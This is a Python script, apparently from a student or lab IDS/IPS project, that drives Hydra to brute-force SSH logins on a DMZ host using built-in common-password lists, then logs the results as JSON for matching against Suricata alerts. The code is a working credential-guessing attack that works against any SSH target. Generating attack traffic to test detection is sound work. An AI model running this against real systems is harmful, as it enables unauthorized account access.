#!/usr/bin/env python3
"""
ssh_bruteforce.py - Hydra-based SSH brute-force attack generator for Project 3
(AI-Assisted IDS/IPS with DMZ)

Runs a controlled Hydra SSH brute-force attempt against a target (default: DMZ-Web)
using a small custom wordlist, and writes structured JSON findings to disk, timestamped
for later correlation against Suricata's eve.json alert log.

This is a deliberately small, fast wordlist -- the goal is to generate a clear
"many failed SSH attempts in a short window" pattern for Suricata to detect,
not to actually crack real credentials.

Usage:
    python3 ssh_bruteforce.py [--target 172.16.30.10] [--user theattacker] [--outdir ./results]
"""

import argparse
import json
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

# Small, deliberately weak/common password list -- controlled lab test only.
DEFAULT_PASSWORD_LIST = [
    "123456",
    "password",
    "admin",
    "qwerty",
    "letmein",
    "changeme",
    "welcome1",
    "password123",
    "admin123",
    "root",
]

# Larger list for a heavier trial -- still weak/common passwords, just more of them,
# to test whether detection is a function of attempt volume/duration rather than
# a complete absence of SSH brute-force signature coverage.
EXTENDED_PASSWORD_LIST = DEFAULT_PASSWORD_LIST + [
    "123456789",
    "1234",
    "12345",
    "1234567",
    "12345678",
    "iloveyou",
    "monkey",
    "dragon",
    "football",
    "baseball",
    "abc123",
    "111111",
    "sunshine",
    "master",
    "shadow",
    "superman",
    "trustno1",
    "starwars",
    "hello",
    "freedom",
    "whatever",
    "qazwsx",
    "passw0rd",
    "login",
    "guest",
    "test",
    "toor",
    "administrator",
    "letmein1",
    "changeme1",
]


def write_wordlist(passwords: list, outdir: Path) -> Path:
    """Write the password list to a temp file for Hydra to consume."""
    wordlist_path = outdir / "passwords.txt"
    with open(wordlist_path, "w") as f:
        f.write("\n".join(passwords) + "\n")
    return wordlist_path


def run_hydra(target: str, user: str, wordlist_path: Path, outdir: Path, threads: int = 4) -> dict:
    """Run hydra against target:22 using the given username and wordlist."""
    start_time = datetime.now(timezone.utc).isoformat()

    hydra_outfile = outdir / "hydra_raw_output.txt"

    cmd = [
        "hydra",
        "-l", user,
        "-P", str(wordlist_path),
        "-t", str(threads),
        "-o", str(hydra_outfile),
        "-f",                    # stop on first valid credential found
        f"ssh://{target}",
    ]

    proc = subprocess.run(cmd, capture_output=True, text=True)

    end_time = datetime.now(timezone.utc).isoformat()

    result = {
        "scan_type": "hydra_ssh_bruteforce",
        "target": target,
        "target_user": user,
        "wordlist_size": sum(1 for _ in open(wordlist_path)),
        "start_time": start_time,
        "end_time": end_time,
        "command_line": " ".join(cmd),
        "return_code": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "credential_found": False,
        "found_credentials": [],
    }

    # Parse hydra's output file for any successful hits, if present
    if hydra_outfile.exists():
        with open(hydra_outfile) as f:
            content = f.read()
            if "login:" in content and "password:" in content:
                result["credential_found"] = True
                result["found_credentials"].append(content.strip())

    return result


def main():
    parser = argparse.ArgumentParser(description="Hydra SSH brute-force attack generator")
    parser.add_argument("--target", default="172.16.30.10", help="Target IP (default: DMZ-Web)")
    parser.add_argument("--user", default="theattacker", help="Username to attempt (default: theattacker)")
    parser.add_argument("--outdir", default="./results", help="Output directory for results")
    parser.add_argument("--extended", action="store_true", help="Use the larger 40-password wordlist instead of the default 10")
    parser.add_argument("--threads", type=int, default=4, help="Hydra parallel connections (-t) (default: 4)")
    args = parser.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    password_list = EXTENDED_PASSWORD_LIST if args.extended else DEFAULT_PASSWORD_LIST
    wordlist_path = write_wordlist(password_list, outdir)
    print(f"[+] Wordlist written to {wordlist_path} ({len(password_list)} passwords, {'extended' if args.extended else 'default'})")

    print(f"[+] Starting Hydra SSH brute-force against {args.target} (user: {args.user}, threads: {args.threads}) ...")
    result = run_hydra(args.target, args.user, wordlist_path, outdir, threads=args.threads)

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    outfile = outdir / f"ssh_bruteforce_{args.target}_{timestamp}.json"

    with open(outfile, "w") as f:
        json.dump(result, f, indent=2)

    print(f"[+] Attack complete. Results written to {outfile}")
    print(f"[+] Credential found: {result['credential_found']}")
    if result["credential_found"]:
        print(f"[+] Details: {result['found_credentials']}")


if __name__ == "__main__":
    main()
